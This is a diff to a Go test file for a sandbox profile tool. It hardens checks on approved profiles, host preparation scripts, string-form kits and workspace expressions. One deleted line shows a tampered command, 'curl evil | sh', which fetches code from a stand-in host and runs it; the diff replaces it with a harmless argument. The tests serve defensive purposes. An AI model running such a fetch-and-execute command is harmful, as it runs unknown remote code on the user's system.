@@ -68,7 +68,7 @@ func TestHostScript_OnlyOneProjectFile(t *testing.T) {
 		wantErr bool
 	}{
 		{"interpreter and script", `["sh", "sandbox/prepare-host.sh"]`, false},
-		{"system interpreter by path", `["/bin/sh", "sandbox/prepare-host.sh"]`, false},
+		{"absolute command outside the project", `["/bin/sh", "sandbox/prepare-host.sh"]`, true},
 		{"a command and a new output", `["cp", "sandbox/prepare-host.sh", "out.txt"]`, false},
 		{"copy over an existing file", `["cp", "sandbox/setup.env", "sandbox/prepare-host.sh"]`, true},
 		{"script and a data file", `["sh", "sandbox/prepare-host.sh", "sandbox/setup.env"]`, true},
@@ -84,7 +84,7 @@ func TestHostScript_OnlyOneProjectFile(t *testing.T) {
 			if (err != nil) != tt.wantErr {
 				t.Fatalf("err = %v, wantErr %v", err, tt.wantErr)
 			}
-			if err != nil && !strings.Contains(err.Error(), "only its script") {
+			if err != nil && !strings.Contains(err.Error(), "only its script") && !strings.Contains(err.Error(), "on PATH") {
 				t.Errorf("err = %v, want it to say how to fix it", err)
 			}
 		})
@@ -103,8 +103,15 @@ func TestApprove_RefusesAProfileParsedFromOtherBytes(t *testing.T) {
 	if _, err := Trust(store, p); err != nil {
 		t.Fatal(err)
 	}
+	// Same files, different command: the digest alone cannot tell them apart,
+	// so only the parsed-profile comparison can refuse it.
 	tampered := p
-	tampered.PrepareHost = []string{"sh", "-c", "curl evil | sh"}
+	tampered.PrepareHost = []string{"sh", "sandbox/prepare-host.sh", "--run-something-else"}
+	if d1, _, err1 := Digest(p); err1 != nil {
+		t.Fatal(err1)
+	} else if d2, _, _ := Digest(tampered); d1 != d2 {
+		t.Fatalf("the test needs one digest for both profiles: %s != %s", d1, d2)
+	}
 	var ut *ErrUntrusted
 	if _, err := Approve(store, tampered); !errors.As(err, &ut) || !ut.Changed {
 		t.Fatalf("err = %v, want untrusted+changed", err)
@@ -237,4 +244,81 @@ func TestHostScript_RemovedScriptStillRunsTheApprovedCopy(t *testing.T) {
 	if arg == "sandbox/prepare-host.sh" || arg == script || ran != "#!/bin/sh\necho prep\n" {
 		t.Errorf("host step ran %q (%q), want the approved copy", arg, ran)
 	}
+}
+
+// sbx accepts a kit as a bare string as well as a mapping. Both forms are
+// read, so a string-form kit can neither hide a lifecycle block nor escape
+// the pin and the copy.
+func TestEnv_StringFormKits(t *testing.T) {
+	t.Run("lifecycle beside a string-form kit is refused", func(t *testing.T) {
+		dir := fixture(t, fullProfile)
+		writeFile(t, filepath.Join(dir, "sandbox", "sbxenv.yaml"),
+			"schemaVersion: \"1\"\nkits:\n  - docker.io/sbx/some-kit:latest\n"+
+				"lifecycle:\n  initialize:\n    - command: /w/helper.sh\n")
+		p, err := LoadProfile(filepath.Join(dir, ProfileFile))
+		if err != nil {
+			t.Fatal(err)
+		}
+		if _, err := PinnedFiles(p); !errors.Is(err, errLifecycle) {
+			t.Errorf("err = %v, want the lifecycle refusal", err)
+		}
+	})
+	t.Run("a string-form local kit is pinned and copied", func(t *testing.T) {
+		dir := fixture(t, fullProfile)
+		writeFile(t, filepath.Join(dir, "sandbox", "sbxenv.yaml"),
+			"schemaVersion: \"1\"\nworkspace: /work/app\nkits:\n  - ./kits/networking\n")
+		p := loadFixtureFrom(t, dir)
+		kit := filepath.Join(dir, "sandbox", "kits", "networking", "spec.yaml")
+		if _, ok := p.files[kit]; !ok {
+			t.Fatalf("the string-form kit is not pinned")
+		}
+		staged, err := p.stageEnv()
+		if err != nil {
+			t.Fatal(err)
+		}
+		body, err := os.ReadFile(filepath.Join(filepath.Dir(staged.EnvFile), "kits", "networking", "spec.yaml"))
+		if err != nil || string(body) != "kind: mixin\n" {
+			t.Errorf("the string-form kit was not copied: %q, %v", body, err)
+		}
+	})
+	t.Run("an entry Quil cannot read is refused", func(t *testing.T) {
+		dir := fixture(t, fullProfile)
+		writeFile(t, filepath.Join(dir, "sandbox", "sbxenv.yaml"), "schemaVersion: \"1\"\nkits:\n  - {name: x}\n")
+		p, err := LoadProfile(filepath.Join(dir, ProfileFile))
+		if err != nil {
+			t.Fatal(err)
+		}
+		if _, err := PinnedFiles(p); err == nil {
+			t.Error("a kit entry without a source was accepted")
+		}
+	})
+}
+
+// A relative workspace that still holds an expression cannot be anchored to
+// the original folder: it may expand to an absolute path. It is refused, at
+// approval already.
+func TestEnv_WorkspaceExpressionIsRefused(t *testing.T) {
+	dir := fixture(t, fullProfile)
+	writeFile(t, filepath.Join(dir, "sandbox", "sbxenv.yaml"),
+		"schemaVersion: \"1\"\nargs:\n  checkout:\n    default: /work/app\nworkspace: ${{ env.args.checkout }}\n")
+	p, err := LoadProfile(filepath.Join(dir, ProfileFile))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if _, err := PinnedFiles(p); err == nil || !strings.Contains(err.Error(), "expression") {
+		t.Errorf("err = %v, want the expression refusal", err)
+	}
+	if _, err := rewriteEnv([]byte("workspace: ${{ env.fileDir }}/x\n"), "/r"); err != nil {
+		t.Errorf("a folder token was refused: %v", err)
+	}
+}
+
+// loadFixtureFrom loads and approves the profile in dir.
+func loadFixtureFrom(t *testing.T, dir string) Approved {
+	t.Helper()
+	p, err := LoadProfile(filepath.Join(dir, ProfileFile))
+	if err != nil {
+		t.Fatal(err)
+	}
+	return approve(t, p)
 }
